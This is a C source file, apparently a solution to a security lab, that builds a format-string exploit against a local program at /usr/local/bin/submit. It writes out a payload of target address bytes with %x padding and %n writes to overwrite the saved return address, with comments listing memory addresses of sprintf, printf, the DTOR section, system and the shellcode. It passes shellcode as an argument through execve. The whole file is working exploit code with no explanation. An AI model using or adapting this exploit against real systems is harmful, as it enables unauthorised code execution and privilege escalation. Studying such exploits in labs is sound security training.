#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include "shellcode.h"

int main(void) {
  char *args[4], *env[1];

  int load_size = 140 - strlen("Submission program version 0.1 (") + 4;

  args[0] = (char*) malloc(load_size + 1);
  strcpy(args[0], "\xac\xdd\xbf\xff.AAA\xad\xdd\xbf\xff.AAA\xae\xdd\xbf\xff.AAA\xaf\xdd\xbf\xff%124x%15$n%039x%17$n%224x%19$n%064x%21$n");
  // eip saved at 0xffbfddac
  // sprintf
  // 0x0804b388
  // printf
  // 0x0804b35c
  // DTOR_END
  // 0x0804b228
  // print_version
  // 0x08048c10
  // system
  // 0x4005a790

  // shellcode
  // 0xffbfdfb8

  args[1] = "-v";
  args[2] = shellcode;
  args[3] = NULL;

  env[0] = NULL;

  return execve("/usr/local/bin/submit", args, env);
}

